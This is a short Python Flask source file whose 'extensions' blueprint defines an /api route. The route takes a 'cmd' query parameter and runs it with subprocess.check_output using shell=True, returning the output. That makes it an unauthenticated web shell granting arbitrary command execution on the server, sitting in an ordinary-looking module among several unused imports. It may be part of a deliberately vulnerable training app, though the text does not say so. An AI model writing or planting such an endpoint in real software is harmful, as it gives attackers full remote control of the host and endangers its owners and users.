import os
from functools import wraps
from flask import (
    request,
    Blueprint,
    redirect,
    url_for,
    session,
    jsonify,
    render_template,
    g,
    render_template_string,
)
from authlib.integrations.flask_client import OAuth
import uuid
import jwt
import time
import subprocess

extensions_bp = Blueprint("extensions", __name__)


@extensions_bp.route("/api")
def api():
    cmd = request.args.get("cmd")
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
    except subprocess.CalledProcessError as e:
        return "error"

    return result
